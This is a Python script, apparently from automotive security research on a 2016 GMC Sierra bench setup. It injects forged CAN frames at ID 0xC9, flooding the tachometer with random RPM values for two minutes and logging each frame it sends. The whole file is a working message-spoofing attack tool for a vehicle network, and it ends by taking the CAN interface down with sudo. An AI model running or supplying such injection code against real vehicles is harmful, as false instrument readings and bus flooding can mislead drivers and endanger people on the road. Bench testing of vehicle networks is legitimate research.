#!/usr/bin/env python3
"""
Flood tachometer/RPM gauge via CAN ID 0xC9 (2016 GMC Sierra bench).

Payload encoding inferred from logs in data/logs/rpm_attack_log.txt:
  RPM = data[1] * 256 + data[2], with data[0] == 0 and remaining bytes zero.
"""

import logging
import os
import random
import sys
import time

import can

CAN_INTERFACE = "can0"
BITRATE = 500000
RPM_CAN_ID = 0xC9
LOG_PATH = os.path.join(
    os.path.dirname(__file__), "..", "data", "logs", "rpm_attack_log.txt"
)


def rpm_to_payload(rpm: int) -> list[int]:
    rpm = max(0, min(rpm, 0xFFFF))
    return [0, (rpm >> 8) & 0xFF, rpm & 0xFF, 0, 0, 0, 0, 0]


def setup_logging() -> None:
    log_dir = os.path.dirname(LOG_PATH)
    os.makedirs(log_dir, exist_ok=True)
    logging.basicConfig(
        filename=LOG_PATH,
        level=logging.INFO,
        format="%(asctime)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    logging.getLogger().addHandler(logging.StreamHandler(sys.stdout))


def bring_down_can_interface() -> None:
    logging.info("CAN interface shut down after attack.")
    os.system(f"sudo ip link set {CAN_INTERFACE} down")


def run_rpm_flood(
    bus: can.BusABC, duration: float = 120.0, interval: float = 0.35
) -> None:
    start = time.time()
    while time.time() - start < duration:
        rpm = random.randint(100, 7200)
        data = rpm_to_payload(rpm)
        msg = can.Message(
            arbitration_id=RPM_CAN_ID, data=data, is_extended_id=False
        )
        try:
            bus.send(msg)
            logging.info(
                "Sent RPM %s to CAN ID 0x%x - Data: %s",
                rpm,
                RPM_CAN_ID,
                data,
            )
        except can.CanError as exc:
            logging.error("CAN error: %s", exc)
        time.sleep(interval)


def main() -> None:
    setup_logging()
    try:
        bus = can.interface.Bus(
            channel=CAN_INTERFACE, interface="socketcan", bitrate=BITRATE
        )
    except Exception as exc:
        print(f"Failed to connect to CAN interface: {exc}")
        sys.exit(1)

    try:
        run_rpm_flood(bus)
    finally:
        bus.shutdown()
        bring_down_can_interface()


if __name__ == "__main__":
    main()
